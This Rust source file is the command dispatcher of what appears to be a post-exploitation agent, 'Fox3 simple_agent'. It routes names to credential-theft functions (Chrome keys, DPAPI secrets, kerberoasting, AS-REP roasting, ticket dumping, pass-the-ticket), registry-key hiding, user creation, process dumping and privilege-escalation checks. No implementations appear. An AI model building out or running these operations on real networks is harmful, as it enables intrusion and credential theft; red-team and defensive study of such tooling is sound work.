/// Command dispatch for Fox3 simple_agent.
///
/// Central dispatcher for all native commands implemented in Rust.
/// Each sub-module contains a category of commands; `dispatch()` routes
/// by command name and returns `anyhow::Result<String>`.

pub mod help;
pub mod crypto;
pub mod network;
pub mod domain;
pub mod services;
pub mod registry;
pub mod schtasks;
pub mod users;
pub mod process;
pub mod files;
pub mod system;
pub mod security;
pub mod ad;
pub mod credentials;
pub mod kerberos;
pub mod privesc;
pub mod ntfs_copy;
pub mod winapi_helpers;

/// Dispatch a command by name.  Returns Ok(output) or Err on failure.
pub fn dispatch(cmd: &str, args: &[String]) -> anyhow::Result<String> {
    match cmd {
        // ── Help ──────────────────────────────────────────────────────────
        "help" => help::run(args),

        // ── Crypto / Hashing ──────────────────────────────────────────────
        "md5"    => crypto::md5(args),
        "sha1"   => crypto::sha1(args),
        "sha256" => crypto::sha256(args),

        // ── Network Enumeration ───────────────────────────────────────────
        "arp"        => network::arp(args),
        "routeprint" => network::routeprint(args),
        "probe"      => network::probe(args),
        "listdns"    => network::listdns(args),
        "nettime"    => network::nettime(args),
        "netuptime"  => network::netuptime(args),
        "netview"    => network::netview(args),

        // ── Domain / User Enumeration ─────────────────────────────────────
        "netuser"                  => domain::netuser(args),
        "netgrouplist"             => domain::net_group_list(args),
        "netgrouplistmembers"      => domain::net_group_list_members(args),
        "netlocalgrouplist"        => domain::net_local_group_list(args),
        "netlocalgrouplistmembers" => domain::net_local_group_list_members(args),
        "netloggedon"              => domain::netloggedon(args),
        "netsession"               => domain::netsession(args),
        "whoami"                   => domain::whoami(args),
        "enumlocalsessions"        => domain::enum_local_sessions(args),

        // ── Service Management ────────────────────────────────────────────
        "sc_query"       => services::sc_query(args),
        "sc_qc"          => services::sc_qc(args),
        "sc_qdescription"=> services::sc_qdescription(args),
        "sc_qfailure"    => services::sc_qfailure(args),
        "sc_enum"        => services::sc_enum(args),
        "sc_create"      => services::sc_create(args),
        "sc_delete"      => services::sc_delete(args),
        "sc_start"       => services::sc_start(args),
        "sc_stop"        => services::sc_stop(args),
        "sc_config"      => services::sc_config(args),
        "sc_description" => services::sc_description(args),
        "sc_failure"     => services::sc_failure(args),

        // ── Registry Operations ───────────────────────────────────────────
        "reg_query"           => registry::reg_query(args),
        "reg_query_recursive" => registry::reg_query_recursive(args),
        "reg_set"             => registry::reg_set(args),
        "reg_delete"          => registry::reg_delete(args),
        "reg_save"            => registry::reg_save(args),
        "reg_hide"            => registry::reg_hide(args),
        "reg_unhide"          => registry::reg_unhide(args),

        // ── Scheduled Tasks ───────────────────────────────────────────────
        "schtasksenum"   => schtasks::schtasksenum(args),
        "schtasksquery"  => schtasks::schtasksquery(args),
        "schtaskscreate" => schtasks::schtaskscreate(args),
        "schtasksdelete" => schtasks::schtasksdelete(args),
        "schtasksrun"    => schtasks::schtasksrun(args),
        "schtasksstop"   => schtasks::schtasksstop(args),

        // ── User Account Management ───────────────────────────────────────
        "adduser"        => users::adduser(args),
        "enableuser"     => users::enableuser(args),
        "disableuser"    => users::disableuser(args),
        "setuserpass"    => users::setuserpass(args),
        "unexpireuser"   => users::unexpireuser(args),
        "addusertogroup" => users::addusertogroup(args),

        // ── Process Operations ────────────────────────────────────────────
        "procdump"           => process::procdump(args),
        "processlisthandles" => process::processlisthandles(args),
        "processdestroy"     => process::processdestroy(args),
        "suspendresume"      => process::suspendresume(args),
        "findloadedmodule"   => process::findloadedmodule(args),
        "listmods"           => process::listmods(args),
        "windowlist"         => process::windowlist(args),
        "get_priv"           => process::get_priv(args),

        // ── File / Share Operations ───────────────────────────────────────
        "cacls"         => files::cacls(args),
        "dir"           => files::dir(args),
        "netshares"     => files::netshares(args),
        "netuse_add"    => files::netuse_add(args),
        "netuse_delete" => files::netuse_delete(args),
        "netuse_list"   => files::netuse_list(args),

        // ── System Information ────────────────────────────────────────────
        "resources"       => system::resources(args),
        "locale"          => system::locale(args),
        "useridletime"    => system::useridletime(args),
        "shutdown"        => system::shutdown(args),
        "driversigs"      => system::driversigs(args),
        "enum_filter_driver" => system::enum_filter_driver(args),

        // ── Security / Audit ──────────────────────────────────────────────
        "adv_audit_policies"  => security::adv_audit_policies(args),
        "list_firewall_rules" => security::list_firewall_rules(args),
        "get_password_policy" => security::get_password_policy(args),

        // ── Active Directory / LDAP ───────────────────────────────────────
        "ldapsearch"       => ad::ldapsearch(args),
        "adcs_enum"        => ad::adcs_enum(args),
        "wmi_query"        => ad::wmi_query(args),
        "get_session_info" => ad::get_session_info(args),

        // ── Credential Operations ─────────────────────────────────────────
        "chromekey"        => credentials::chromekey(args),
        "get_dpapi_system" => credentials::get_dpapi_system(args),
        "adcs_request"     => credentials::adcs_request(args),
        "ghost_task"       => credentials::ghost_task(args),

        // ── Kerberos Operations ──────────────────────────────────────────
        "krb_asktgt"        => kerberos::krb_asktgt(args),
        "krb_asktgs"        => kerberos::krb_asktgs(args),
        "krb_renew"         => kerberos::krb_renew(args),
        "krb_s4u"           => kerberos::krb_s4u(args),
        "krb_cross_s4u"     => kerberos::krb_cross_s4u(args),
        "krb_ptt"           => kerberos::krb_ptt(args),
        "krb_purge"         => kerberos::krb_purge(args),
        "krb_describe"      => kerberos::krb_describe(args),
        "krb_klist"         => kerberos::krb_klist(args),
        "krb_dump"          => kerberos::krb_dump(args),
        "krb_triage"        => kerberos::krb_triage(args),
        "krb_tgtdeleg"      => kerberos::krb_tgtdeleg(args),
        "krb_kerberoasting" => kerberos::krb_kerberoasting(args),
        "krb_asreproasting" => kerberos::krb_asreproasting(args),
        "krb_hash"          => kerberos::krb_hash(args),
        "krb_changepw"      => kerberos::krb_changepw(args),

        // ── Privilege Escalation Checks ──────────────────────────────────
        "privcheck"              => privesc::privcheck(args),
        "alwaysinstallelevated"  => privesc::alwaysinstallelevated(args),
        "autologoncheck"         => privesc::autologoncheck(args),
        "credmancheck"           => privesc::credmancheck(args),
        "hijackablepathcheck"    => privesc::hijackablepathcheck(args),
        "modifiableautoruncheck" => privesc::modifiableautoruncheck(args),
        "modifiablesvccheck"     => privesc::modifiablesvccheck(args),
        "tokenprivcheck"         => privesc::tokenprivcheck(args),
        "unquotedsvcpathcheck"   => privesc::unquotedsvcpathcheck(args),
        "pshistorycheck"         => privesc::pshistorycheck(args),
        "uacstatuscheck"         => privesc::uacstatuscheck(args),

        // ── NTFS Raw Copy (AxiomSecrets) ────────────────────────────────
        "ntfs_copy" => ntfs_copy::ntfs_copy(args),
        "ntfs_read" => ntfs_copy::ntfs_read(args),

        _ => anyhow::bail!("unknown command: '{}'. Type 'help' for available commands or 'help <command>' for details", cmd),
    }
}
